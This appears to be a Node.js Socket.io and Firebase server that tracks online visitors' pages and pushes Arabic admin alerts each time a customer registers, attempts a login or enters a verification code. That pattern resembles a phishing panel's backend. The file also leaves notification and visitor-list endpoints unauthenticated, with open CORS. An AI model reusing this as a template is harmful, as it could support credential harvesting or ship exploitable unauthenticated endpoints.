const express = require('express');
const { createServer } = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const admin = require('firebase-admin');

// ═══════════════════════════════════════════════════════════
// FIREBASE ADMIN INITIALIZATION
// ═══════════════════════════════════════════════════════════

let firebaseInitialized = false;
let firestoreDb = null;

function initializeFirebase() {
  console.log('[Firebase] 🔧 Initializing Firebase Admin SDK...');
  
  if (firebaseInitialized) {
    console.log('[Firebase] Already initialized, skipping...');
    return;
  }
  
  try {
    const serviceAccountStr = process.env.FIREBASE_SERVICE_ACCOUNT;
    console.log('[Firebase] 📋 FIREBASE_SERVICE_ACCOUNT:', serviceAccountStr ? 'FOUND' : 'NOT FOUND');
    
    if (serviceAccountStr) {
      const serviceAccount = JSON.parse(serviceAccountStr);
      console.log('[Firebase] 📊 Service account project_id:', serviceAccount.project_id);
      console.log('[Firebase] 📊 Service account client_email:', serviceAccount.client_email);
      
      admin.initializeApp({
        credential: admin.credential.cert(serviceAccount),
      });
      
      firestoreDb = admin.firestore();
      firebaseInitialized = true;
      
      console.log('[Firebase] ✅ Firebase Admin initialized successfully');
      console.log('[Firebase] ✅ Firestore initialized');
    } else {
      console.log('[Firebase] ❌ FIREBASE_SERVICE_ACCOUNT not found');
    }
  } catch (error) {
    console.log('[Firebase] ❌ Error initializing Firebase:', error.message);
  }
}

initializeFirebase();

// ═══════════════════════════════════════════════════════════
// EXPRESS & SOCKET.IO SETUP
// ═══════════════════════════════════════════════════════════

const app = express();
app.use(cors());
app.use(express.json());

const httpServer = createServer(app);

const io = new Server(httpServer, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST'],
  },
});

function log(message, data = null) {
  const timestamp = new Date().toISOString();
  const logMessage = data ? `${timestamp} - ${message} ${JSON.stringify(data)}` : `${timestamp} - ${message}`;
  console.log(logMessage);
}

log('🚀 Socket.io Server starting...');

// ═══════════════════════════════════════════════════════════
// FCM PUSH NOTIFICATIONS
// ═══════════════════════════════════════════════════════════

async function sendPushNotification(tokens, title, body, data = {}) {
  console.log('[FCM] 🚀 sendPushNotification called');
  
  if (!firebaseInitialized) {
    console.log('[FCM] ❌ Firebase Admin SDK not initialized');
    return { success: false, error: 'Firebase not initialized' };
  }

  if (!tokens || tokens.length === 0) {
    console.log('[FCM] ❌ No tokens provided');
    return { success: false, error: 'No tokens provided' };
  }

  try {
    const message = {
      notification: { title, body },
      data: { ...data, click_action: '/admin' },
      tokens: tokens,
    };

    const frontendUrl = process.env.FRONTEND_URL?.replace(/\/$/, '');
    if (frontendUrl) {
      message.webpush = {
        fcmOptions: { link: `${frontendUrl}/admin` },
      };
    }

    const response = await admin.messaging().sendEachForMulticast(message);
    
    console.log('[FCM] ✅ Success:', response.successCount, 'Failure:', response.failureCount);

    return {
      success: response.successCount > 0,
      successCount: response.successCount,
      failureCount: response.failureCount,
    };
  } catch (error) {
    console.error('[FCM] ❌ Exception:', error.message);
    return { success: false, error: error.message };
  }
}

// ═══════════════════════════════════════════════════════════
// FIRESTORE HELPERS
// ═══════════════════════════════════════════════════════════

async function getAdminTokensFromFirestore() {
  if (!firestoreDb || !firebaseInitialized) return [];

  try {
    const tokensSnapshot = await firestoreDb.collection('adminTokens').get();
    const tokens = [];
    
    tokensSnapshot.forEach((doc) => {
      const data = doc.data();
      if (data.fcmToken) tokens.push(data.fcmToken);
    });
    
    console.log('[Firestore] 📊 Found', tokens.length, 'admin tokens');
    return tokens;
  } catch (error) {
    console.error('[Firestore] ❌ Error:', error.message);
    return [];
  }
}

// ═══════════════════════════════════════════════════════════
// ONLINE USERS MANAGEMENT
// ═══════════════════════════════════════════════════════════

const onlineUsers = new Map();

function broadcastUsers() {
  const users = Array.from(onlineUsers.values());
  io.emit('users_update', users);
}

// Clean up stale users every 30 seconds
setInterval(() => {
  const now = Date.now();
  for (const [clientId, user] of onlineUsers.entries()) {
    const lastSeen = new Date(user.lastSeen).getTime();
    if (now - lastSeen > 30000) {
      onlineUsers.delete(clientId);
    }
  }
  broadcastUsers();
}, 30000);

// ═══════════════════════════════════════════════════════════
// SOCKET.IO EVENT HANDLERS
// ═══════════════════════════════════════════════════════════

io.on('connection', (socket) => {
  log(`🔌 Client connected: ${socket.id}`);

  socket.on('registration_completed', async (data, acknowledge) => {
    log('📝 Registration completed', { id: data?.id });
    await dispatchEventNotification('registration', data);
    io.emit('new_registration', data);
    if (typeof acknowledge === 'function') acknowledge({ success: true });
  });

  socket.on('login_attempt_completed', async (data, acknowledge) => {
    log('🔐 Login attempt completed', { id: data?.id });
    await dispatchEventNotification('login_attempt', data);
    if (typeof acknowledge === 'function') acknowledge({ success: true });
  });

  socket.on('verification_code_completed', async (data, acknowledge) => {
    log('🔢 Verification code completed', { id: data?.id });
    await dispatchEventNotification('verification_code', data);
    if (typeof acknowledge === 'function') acknowledge({ success: true });
  });

  socket.on('user_online', (data) => {
    const { clientId, page } = data;
    if (!clientId) return;

    const user = { clientId, page: page || '/', online: true, lastSeen: new Date().toISOString() };
    onlineUsers.set(clientId, user);
    log(`✅ User online: ${clientId} on page: ${page}`);
    broadcastUsers();
  });

  socket.on('user_page_change', (data) => {
    const { clientId, page } = data;
    if (!clientId || !onlineUsers.has(clientId)) return;

    const user = onlineUsers.get(clientId);
    user.page = page;
    user.lastSeen = new Date().toISOString();
    onlineUsers.set(clientId, user);
    broadcastUsers();
  });

  socket.on('user_heartbeat', (data) => {
    const { clientId } = data;
    if (!clientId || !onlineUsers.has(clientId)) return;

    const user = onlineUsers.get(clientId);
    user.lastSeen = new Date().toISOString();
    user.online = true;
    onlineUsers.set(clientId, user);
  });

  socket.on('user_offline', (data) => {
    const { clientId } = data;
    if (clientId && onlineUsers.has(clientId)) {
      onlineUsers.delete(clientId);
      broadcastUsers();
    }
  });

  socket.on('disconnect', () => {
    log(`🔌 Client disconnected: ${socket.id}`);
  });
});

// ═══════════════════════════════════════════════════════════
// NOTIFICATION CONFIGURATION
// ═══════════════════════════════════════════════════════════

const EVENT_NOTIFICATION_CONFIG = {
  registration: {
    title: '📝 طلب تسجيل جديد',
    body: (eventData) => eventData.name ? `طلب جديد للعميل ${eventData.name}` : 'لديك طلب تسجيل جديد',
    data: (eventData) => ({ type: 'new_registration', registrationId: String(eventData.id || ''), customerName: String(eventData.name || '') }),
  },
  login_attempt: {
    title: '🔐 تسجيل دخول جديد',
    body: (eventData) => eventData.name ? `محاولة دخول للعميل ${eventData.name}` : 'محاولة تسجيل دخول جديدة',
    data: (eventData) => ({ type: 'new_login_attempt', loginAttemptId: String(eventData.id || ''), customerName: String(eventData.name || '') }),
  },
  verification_code: {
    title: '🔢 رمز تحقق جديد',
    body: (eventData) => eventData.name ? `رمز تحقق للعميل ${eventData.name}` : 'رمز تحقق جديد',
    data: (eventData) => ({ type: 'new_verification_code', customerName: String(eventData.name || '') }),
  },
};

const RECENT_NOTIFICATION_TTL_MS = 5 * 60 * 1000;
const recentNotificationKeys = new Map();

async function dispatchEventNotification(eventType, eventData) {
  const config = EVENT_NOTIFICATION_CONFIG[eventType];
  const eventId = eventData?.id ? String(eventData.id) : '';

  if (!config || !eventId) {
    return { success: false, error: 'Missing config or eventId' };
  }

  const notificationKey = `${eventType}:${eventId}`;

  if (recentNotificationKeys.has(notificationKey)) {
    console.log('[FCM] Duplicate skipped:', notificationKey);
    return { success: true, deduplicated: true };
  }

  console.log('[FCM] 🔔 Dispatching notification:', notificationKey);

  const tokens = await getAdminTokensFromFirestore();

  if (tokens.length === 0) {
    console.log('[FCM] ⚠️ No admin tokens');
    return { success: false, error: 'No admin tokens' };
  }

  const result = await sendPushNotification(tokens, config.title, config.body(eventData), config.data(eventData));

  if (result.success) {
    recentNotificationKeys.set(notificationKey, Date.now());
  }

  return result;
}

// ═══════════════════════════════════════════════════════════
// REST API ENDPOINTS
// ═══════════════════════════════════════════════════════════

app.get('/health', (req, res) => {
  res.json({ status: 'ok', firebase: firebaseInitialized, timestamp: new Date().toISOString() });
});

app.get('/api/online-users', (req, res) => {
  const users = Array.from(onlineUsers.values());
  res.json({ total: users.length, users });
});

app.post('/api/test-notification', async (req, res) => {
  try {
    const { title, body } = req.body;
    const tokens = await getAdminTokensFromFirestore();
    const result = await sendPushNotification(tokens, title || 'Test', body || 'Test notification');
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ═══════════════════════════════════════════════════════════
// START SERVER
// ═══════════════════════════════════════════════════════════

const PORT = process.env.PORT || 3001;

httpServer.listen(PORT, async () => {
  console.log('');
  console.log('╔══════════════════════════════════════════════════════════╗');
  console.log('║        🚀 Socket.io Server Started                  ║');
  console.log('╠══════════════════════════════════════════════════════════╣');
  console.log(`║  Port: ${PORT}`);
  console.log(`║  Firebase: ${firebaseInitialized ? '✅ Initialized' : '❌ NOT Initialized'}`);
  console.log('╚══════════════════════════════════════════════════════════╝');
});
